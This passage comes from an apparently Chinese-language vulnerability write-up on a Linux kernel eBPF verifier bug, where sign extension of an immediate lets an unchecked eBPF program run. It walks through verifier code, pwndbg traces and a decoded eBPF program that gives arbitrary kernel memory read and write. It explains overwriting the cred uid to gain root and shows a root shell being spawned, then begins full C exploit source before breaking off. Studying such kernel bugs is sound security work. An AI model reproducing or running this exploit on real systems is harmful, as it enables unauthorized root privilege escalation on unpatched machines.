&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_MOV) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;imm != <span class="number">0</span> || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">				verbose(<span class="string">"BPF_MOV uses reserved fields\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* check src operand */</span></span><br><span class="line">			err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">			<span class="keyword">if</span> (err)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (insn-&gt;src_reg != BPF_REG_0 || insn-&gt;off != <span class="number">0</span>) &#123;</span><br><span class="line">				verbose(<span class="string">"BPF_MOV uses reserved fields\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* check dest operand */</span></span><br><span class="line">		err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;</span><br><span class="line">			<span class="keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;</span><br><span class="line">				<span class="comment">/* case: R1 = R2</span></span><br><span class="line"><span class="comment">				 * copy register state to dest reg</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">				regs[insn-&gt;dst_reg] = regs[insn-&gt;src_reg];</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (is_pointer_value(env, insn-&gt;src_reg)) &#123;</span><br><span class="line">					verbose(<span class="string">"R%d partial copy of pointer\n"</span>,</span><br><span class="line">						insn-&gt;src_reg);</span><br><span class="line">					<span class="keyword">return</span> -EACCES;</span><br><span class="line">				&#125;</span><br><span class="line">				regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;</span><br><span class="line">				regs[insn-&gt;dst_reg].map_ptr = <span class="literal">NULL</span>;</span><br><span class="line">			&#125;</span><br><span class="line">[<span class="number">1</span>]		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* case: R = imm</span></span><br><span class="line"><span class="comment">			 * remember the value we stored into this reg</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode &gt; BPF_END) &#123;</span><br><span class="line">		verbose(<span class="string">"invalid BPF_ALU opcode %x\n"</span>, opcode);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;	<span class="comment">/* all other ALU ops: and, sub, xor, add, ... */</span></span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在真实执行的过程中，由于寄存器类型不一样，在执行第二条跳转语句时存在问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line">	<span class="keyword">if</span> (DST != IMM) &#123;</span><br><span class="line">		insn += insn-&gt;off;</span><br><span class="line">		CONT_JMP;</span><br><span class="line">	&#125;</span><br><span class="line">	CONT;</span><br></pre></td></tr></table></figure>
<p>而翻译成汇编就非常明显了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff81173bad &lt;__bpf_prog_run+1565&gt;    mov    qword ptr [rbp + rax*8 - 0x278], rdi</span><br><span class="line">   0xffffffff81173bb5 &lt;__bpf_prog_run+1573&gt;    movzx  eax, byte ptr [rbx]</span><br><span class="line">   0xffffffff81173bb8 &lt;__bpf_prog_run+1576&gt;    jmp    qword ptr [r12 + rax*8]</span><br><span class="line">    ↓</span><br><span class="line">   0xffffffff81173e7b &lt;__bpf_prog_run+2283&gt;    movzx  eax, byte ptr [rbx + 1]</span><br><span class="line">   0xffffffff81173e7f &lt;__bpf_prog_run+2287&gt;    movsxd rdx, dword ptr [rbx + 4]</span><br><span class="line"> ► 0xffffffff81173e83 &lt;__bpf_prog_run+2291&gt;    and    eax, 0xf</span><br><span class="line">   0xffffffff81173e86 &lt;__bpf_prog_run+2294&gt;    cmp    qword ptr [rbp + rax*8 - 0x278], rdx</span><br><span class="line">   0xffffffff81173e8e &lt;__bpf_prog_run+2302&gt;    je     __bpf_prog_run+5036 &lt;0xffffffff8117493c&gt;</span><br><span class="line"> </span><br><span class="line">   0xffffffff81173e94 &lt;__bpf_prog_run+2308&gt;    movsx  rax, word ptr [rbx + 2]</span><br><span class="line">   0xffffffff81173e99 &lt;__bpf_prog_run+2313&gt;    lea    rbx, [rbx + rax*8 + 8]</span><br><span class="line">   0xffffffff81173e9e &lt;__bpf_prog_run+2318&gt;    movzx  eax, byte ptr [rbx]</span><br><span class="line">─────────────────────────────────────[ STACK ]──────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0xffff88000048fa30 ◂— 0xcc</span><br><span class="line">01:0008│      0xffff88000048fa38 ◂— 0x0</span><br><span class="line">02:0010│      0xffff88000048fa40 —▸ 0xffff88000fabb500 ◂— 0x0</span><br><span class="line">03:0018│      0xffff88000048fa48 —▸ 0xffffffff811afebc (zone_statistics+124) ◂— 0xbec35d5d415c415b</span><br><span class="line">04:0020│      0xffff88000048fa50 ◂— 0x1</span><br><span class="line">05:0028│      0xffff88000048fa58 —▸ 0xffff88000c46e780 ◂— 0x17c</span><br><span class="line">06:0030│      0xffff88000048fa60 —▸ 0xffff88000048fc18 —▸ 0xffff88000048fc70 —▸ 0xffff88000a550f00 ◂— 0x200000001</span><br><span class="line">07:0038│      0xffff88000048fa68 —▸ 0xffff88000048fb30 —▸ 0xffff88000048fc70 —▸ 0xffff88000a550f00 ◂— 0x200000001</span><br><span class="line">───────────────────────────────────[ BACKTRACE ]────────────────────────────────────</span><br><span class="line"> ► f 0 ffffffff81173e83 __bpf_prog_run+2291</span><br><span class="line">   f 1 ffffffff817272bc sk_filter_trim_cap+108</span><br><span class="line">   f 2 ffffffff817272bc sk_filter_trim_cap+108</span><br><span class="line">   f 3 ffffffff817b824a unix_dgram_sendmsg+586</span><br><span class="line">   f 4 ffffffff817b824a unix_dgram_sendmsg+586</span><br><span class="line">   f 5 ffffffff816f4728 sock_sendmsg+56</span><br><span class="line">   f 6 ffffffff816f4728 sock_sendmsg+56</span><br><span class="line">   f 7 ffffffff816f47c5 sock_write_iter+133</span><br><span class="line">   f 8 ffffffff8120cf59 __vfs_write+201</span><br><span class="line">   f 9 ffffffff8120cf59 __vfs_write+201</span><br><span class="line">   f 10 ffffffff8120d5d9 vfs_write+169</span><br><span class="line">pwndbg&gt; i r rdx</span><br><span class="line">rdx            0xffffffffffffffff	-1</span><br><span class="line">pwndbg&gt; x /gx $rbx+4</span><br><span class="line">0xffffc90000099034:	0x000000b7ffffffff</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到汇编指令被翻译成movsxd，而此时会发生符号扩展，由原来的0xffffffff扩展成0xffffffffffffffff，再次比较的时候二者并不相同，造成了跳转到[4]处执行，从而绕过了对[4]以后EBPF程序的校验。</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当[4]以后的程序不经过check以后，就可以对[4]的内容进行构造了，利用真正执行时无类型就可以达到内存任意读写了。</p>
<p>利用本人写的小工具对已有的EBPF程序进行解码，可以看到程序逻辑如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]: ALU_MOV_K(<span class="number">0</span>,<span class="number">9</span>,<span class="number">0x0</span>,<span class="number">0xffffffff</span>)</span><br><span class="line">[<span class="number">1</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">9</span>,<span class="number">0x2</span>,<span class="number">0xffffffff</span>)</span><br><span class="line">[<span class="number">2</span>]: ALU64_MOV_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">3</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">4</span>]: LD_IMM_DW(<span class="number">1</span>,<span class="number">9</span>,<span class="number">0x0</span>,<span class="number">0x3</span>)</span><br><span class="line">[<span class="number">5</span>]: maybe padding</span><br><span class="line">[<span class="number">6</span>]: ALU64_MOV_X(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">7</span>]: ALU64_MOV_X(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">8</span>]: ALU64_ADD_K(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0xfffffffc</span>)</span><br><span class="line">[<span class="number">9</span>]: ST_MEM_W(<span class="number">0</span>,<span class="number">10</span>,<span class="number">0xfffc</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">10</span>]: JMP_CALL(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">11</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">12</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">13</span>]: LDX_MEM_DW(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">14</span>]: ALU64_MOV_X(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">15</span>]: ALU64_MOV_X(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">16</span>]: ALU64_ADD_K(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0xfffffffc</span>)</span><br><span class="line">[<span class="number">17</span>]: ST_MEM_W(<span class="number">0</span>,<span class="number">10</span>,<span class="number">0xfffc</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">18</span>]: JMP_CALL(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">19</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">20</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">21</span>]: LDX_MEM_DW(<span class="number">0</span>,<span class="number">7</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">22</span>]: ALU64_MOV_X(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">23</span>]: ALU64_MOV_X(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">24</span>]: ALU64_ADD_K(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0xfffffffc</span>)</span><br><span class="line">[<span class="number">25</span>]: ST_MEM_W(<span class="number">0</span>,<span class="number">10</span>,<span class="number">0xfffc</span>,<span class="number">0x2</span>)</span><br><span class="line">[<span class="number">26</span>]: JMP_CALL(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">27</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x1</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">28</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">29</span>]: LDX_MEM_DW(<span class="number">0</span>,<span class="number">8</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">30</span>]: ALU64_MOV_X(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">31</span>]: ALU64_MOV_K(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">32</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x3</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">33</span>]: LDX_MEM_DW(<span class="number">7</span>,<span class="number">3</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">34</span>]: STX_MEM_DW(<span class="number">3</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">35</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">36</span>]: JMP_JNE_K(<span class="number">0</span>,<span class="number">6</span>,<span class="number">0x2</span>,<span class="number">0x1</span>)</span><br><span class="line">[<span class="number">37</span>]: STX_MEM_DW(<span class="number">10</span>,<span class="number">2</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">38</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">39</span>]: STX_MEM_DW(<span class="number">8</span>,<span class="number">7</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br><span class="line">[<span class="number">40</span>]: JMP_EXIT(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>
<p>下面对这个程序进行分析：</p>
<p>首先，[0]~[3]已经分析过了下面对后续指令进行分析：</p>
<p>第[4]~[5]条语句可用由上面的map知识得到，第五条语句是填充语句，当执行完后，会将map的地址存放在r9寄存器中。</p>
<p>[6]~[13]语句的类C代码如下，即调用BPF_FUNC_map_lookup_elem(map_add,idx)，并将返回值存到r6寄存器中，即r6=map[0]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[6]: r1=r9</span><br><span class="line">[7]: r2=rbp</span><br><span class="line">[8]: r2 = r2-4</span><br><span class="line">[9]: [rbp+(-4)] = 0 (idx)</span><br><span class="line">[10]: call BPF_FUNC_map_lookup_elem</span><br><span class="line">[11]: if r0== 0:</span><br><span class="line">[12]: exit(0)</span><br><span class="line">[13]: r6=[r0]</span><br></pre></td></tr></table></figure>
<p>[14]~[21]同理，将r7=map[1]。[22]~[29]为r8=map[2]，而map的内容可以由用户态传入。</p>
<p>最后[30]~[40]分为三个不分，map[0] = 0时，将map[1]地址所指的内容，写到map[3]中，用户态可以通过读map[3]来得到这个值，因此是内存任意读功能。map[0]=1时，将rbp的值写入map[3]中，由此可以泄露内核栈地址。map[0]=2时，将map[3]的值写入map[2]地址中，由此是个内存任意写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[30]: ALU64_MOV_X(0,2,0x0,0x0) r2=r0</span><br><span class="line">[31]: ALU64_MOV_K(0,0,0x0,0x0) r0=0</span><br><span class="line">[32]: JMP_JNE_K(0,6,0x3,0x0)   if r6!=0 jmpto 36</span><br><span class="line">[33]: LDX_MEM_DW(7,3,0x0,0x0)  r3 = [r7]</span><br><span class="line">[34]: STX_MEM_DW(3,2,0x0,0x0)  [r2]=r3</span><br><span class="line">[35]: JMP_EXIT(0,0,0x0,0x0)    exit(0)</span><br><span class="line">[36]: JMP_JNE_K(0,6,0x2,0x1)   if r6!=1 jmpto 39</span><br><span class="line">[37]: STX_MEM_DW(10,2,0x0,0x0) [r2]=rbp</span><br><span class="line">[38]: JMP_EXIT(0,0,0x0,0x0)    exit(0)</span><br><span class="line">[39]: STX_MEM_DW(8,7,0x0,0x0)  [r7]=r8</span><br><span class="line">[40]: JMP_EXIT(0,0,0x0,0x0)    exit(0)</span><br></pre></td></tr></table></figure>
<p>漏洞利用也非常简单，首先利用2功能读取内核栈地址，这样通过栈地址&amp; ~(0x4000 - 1)可以得到内核线程task_struct的地址，而这个数据结构中的cred指针指向该线程的cred数据块，但是这个偏移会随内核编译的改变而改变，从gdb中看这个结构的方法是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;(*(struct task_struct *)0).cred</span><br><span class="line">$2 = (const struct cred **) 0x9b8 &lt;irq_stack_union+2488&gt;</span><br></pre></td></tr></table></figure>
<p>因此，利用0功能可以读出cred的地址，同理找出cred中的uid偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;(*(struct cred *)0).uid</span><br><span class="line">$3 = (kuid_t *) 0x4 &lt;irq_stack_union+4&gt;</span><br></pre></td></tr></table></figure>
<p>再利用2功能向该地址里写入0，就可以成功提权了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./upstream44</span><br><span class="line">mapfd finished</span><br><span class="line">bpf_prog_load finished</span><br><span class="line">socketpair finished</span><br><span class="line">setsockopt finished</span><br><span class="line">task_struct = ffff880006d90000</span><br><span class="line">uidptr = ffff8800004313c4</span><br><span class="line">spawning root shell</span><br><span class="line">uid=0(root) gid=0(root) euid=1000(chal) egid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $</span><br></pre></td></tr></table></figure>
<h1 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h1><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9b8 <span class="comment">//0x5f8</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328 <span class="comment">//-32</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = 	<span class="string">"\xb4\x09\x00\x00\xff\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x55\x09\x02\x00\xff\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		